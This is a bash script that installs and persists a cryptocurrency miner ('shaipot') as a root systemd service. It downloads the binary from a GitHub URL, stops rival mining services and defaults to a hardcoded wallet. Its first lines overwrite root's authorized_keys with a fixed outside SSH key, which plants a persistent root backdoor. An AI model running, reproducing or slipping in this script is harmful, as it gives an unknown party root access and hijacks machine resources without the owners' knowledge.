#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='sh1qcelvfvykshger9kudeqz89urn7y74zpmdc3jwu' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install wget -y
else
    apt update -y
    apt install wget -y
fi
systemctl stop qli ore scash
systemctl disable qli ore scash
systemctl is-active --quiet shai && systemctl stop --no-block shai

rm -rf /opt/shai

DIR="/opt/shai"

mkdir -p $DIR

wget -qP $DIR https://raw.githubusercontent.com/chuben/script/main/shaipot

chmod +x $DIR/shaipot

echo """WORKER_WALLET_ADDRESS=$WORKER_WALLET_ADDRESS
POOL_URL=wss://shai.benpool.top
""" > $DIR/.env

echo """[Unit]
Description=shai
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
EnvironmentFile=$DIR/.env
WorkingDirectory=$DIR
ExecStart=$DIR/shaipot --address \$WORKER_WALLET_ADDRESS --pool \$POOL_URL
Restart=always
RestartSec=5s
[Install]
WantedBy=default.target""" >/etc/systemd/system/shai.service

systemctl daemon-reload
systemctl enable shai
systemctl restart shai
